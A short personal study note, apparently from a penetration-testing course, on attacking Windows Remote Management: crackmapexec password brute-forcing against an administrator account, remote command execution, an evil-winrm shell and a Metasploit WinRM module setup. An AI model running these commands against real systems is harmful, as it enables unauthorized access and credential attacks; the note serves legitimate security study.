202403181436
Status: #Note
Tags: #Exploitation #Windows #WinRM

# Exploiting WinRM

## Overview
- Typically uses *TCP port 5985* and *5986* (HTTPS)
- Is a Windows Remote Management protocol that can be uses to facilitate remote access over HTTP(S).
- It utilizes various forms of authentication.
- We can use `crackmapexec` to brute-force in order to identify users and passwords, and execute commands on the target.
- We can also use `evil-winrm` to obtain a shell session on the target.


## Exploitation

*Brute-forcing Password*
```bash
crackmapexec winrm 192.168.1.1 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

*Execute commands (Creds Needed)*
```bash
crackmapexec winrm 192.168.1.1 -u administrator -p thepassword -x "whoami"
```

*Establishing a shell*
```bash
evil-winrm-rb -u administrator -p 'thepassword' -i 192.168.1.1
```

### Metasploit
*Execute commands (Creds Needed)*
```bash
service postgresql start && msfconsole
msf5 > use exploit/windows/winrm/winrm_script_exec
msf5 > set RHOSTS 192.168.1.1
msf5 > set FORCE_VBS true
msf5 > set USERNAME administrator
msf5 > set PASSWORD thepassword
msf5 > exploit
```


### Supplementary

### Sources
[INE - Host & Network Penetration Testing: System/Host Based Attacks](https://my.ine.com/CyberSecurity/courses/67c3945f/host-network-penetration-testing-systemhost-based-attacks)
